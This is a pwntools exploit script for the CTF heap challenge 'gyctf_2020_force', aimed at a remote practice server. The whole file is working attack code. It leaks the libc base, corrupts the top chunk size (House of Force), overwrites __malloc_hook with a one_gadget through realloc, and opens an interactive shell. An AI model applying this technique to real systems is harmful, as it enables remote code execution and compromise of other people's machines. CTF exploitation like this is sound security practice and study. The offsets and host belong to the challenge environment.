from pwn import *

#context.log_level = 'debug'

#p = process('./gyctf_2020_force')
p = remote('node4.buuoj.cn', 28626)
libc = ELF('libc-2.23.buu.so')

def debug():
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''')
    pause()

def alloc(size, content):
    p.sendlineafter(b'puts\n', b'1')
    p.sendlineafter(b'size\n', str(size).encode())
    p.recvuntil(b'bin addr ')
    addr = int(p.recv(14), 16)
    p.sendafter(b'content\n', content)
    return addr

def puts():
    p.sendlineafter(b'puts\n', b'2')

libc_base = alloc(0x2330000, b'a') + 0x2331000 - 0x10

print('[+] libc_base -> {}'.format(hex(libc_base)))

malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['__libc_realloc']

one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
one_gadgets_buu = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget = one_gadgets_buu[1] + libc_base

top = alloc(0x10, b'a' * 0x10 + p64(0) + p64(0xffffffffffffffff)) + 0x10

addr = alloc(malloc_hook - top - 0x30, b'a')
addr = alloc(0x50, b'a' * 0x8 + p64(one_gadget) + p64(realloc + 0x10))

p.sendlineafter(b'puts\n', b'1')
p.sendlineafter(b'size\n', b'2')

p.interactive()